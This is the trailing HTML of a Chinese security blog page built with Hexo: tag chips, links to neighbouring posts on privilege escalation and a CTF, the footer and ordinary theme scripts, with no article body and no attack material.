    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
                                    <span class="chip bg-color">æ˜¥ç§‹äº‘é•œ</span>
                                </a>
                            
                                <a href="/tags/%E6%B8%97%E9%80%8F/">
                                    <span class="chip bg-color">æ¸—é€</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2025/10/03/privilege/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="privilege">
                        
                        <span class="card-title">privilege</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-10-03
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            q1n9
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
                        <span class="chip bg-color">æ˜¥ç§‹äº‘é•œ</span>
                    </a>
                    
                    <a href="/tags/%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">æ¸—é€</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/09/21/wmctf/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="wmctf">
                        
                        <span class="card-title">wmctf</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-09-21
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            q1n9
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2025-2026</span>
            
            <a href="/about" target="_blank">q1n9</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                        class="white-color">172.2k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- è¿è¡Œå¤©æ•°æé†’. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQè”ç³»æˆ‘: 1625684832" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- ç™½å¤©å’Œé»‘å¤œä¸»é¢˜ -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- é›ªèŠ±ç‰¹æ•ˆ -->
     
        <script type="text/javascript">
            // åªåœ¨æ¡Œé¢ç‰ˆç½‘é¡µå¯ç”¨ç‰¹æ•ˆ
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
            }
        </script>
    

    <!-- é¼ æ ‡æ˜Ÿæ˜Ÿç‰¹æ•ˆ -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--è…¾è®¯å…”å°å·¢-->
    
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
